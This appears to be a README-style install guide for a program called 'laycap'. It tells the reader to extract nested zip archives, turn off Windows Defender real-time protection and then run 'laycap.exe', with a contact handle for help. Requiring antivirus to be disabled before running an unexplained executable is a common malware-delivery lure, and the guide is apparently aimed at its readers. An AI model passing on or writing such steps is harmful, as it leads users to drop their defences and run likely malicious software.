# Instructions for Installing laycap Application

Follow these steps to install and run the "laycap" application:

1. **Extracting the vilansi.zip folder:**
   - Locate the `vilansi.zip` folder in your file directory.
   - Right-click on the `vilansi.zip` folder.
   - Select "Extract" or "Extract Here" from the context menu.
   - Wait for the extraction process to complete.

2. **go to the vilansi folder:**
   - Open the extracted folder named `vilansi`.

3. **Disable Windows Defender Manually:**
   - Click on the **Start** menu (Windows icon).
   - Type **Virus & threat protection** in the search bar and select it from the results.
   - Click on **Manage settings** under the **Virus & threat protection settings** section.
   - Turn off the switch under **Real-time protection**. Confirm any prompts to complete this action.


4. **Extracting and running 2_laycap.zip:**
   - After Windows Defender has been turned off, locate the file `2_laycap.zip` within the `vilansi` folder.
   - Right-click on `2_laycap.zip`.
   - Select "Extract" or "Extract Here" from the context menu.
   - Once the extraction is complete, locate the extracted files.
   - Double-click on `laycap.exe` to run it.

Following these steps should help you install and run the laycap application smoothly. If you encounter any issues, feel free to contact @tar-vc.
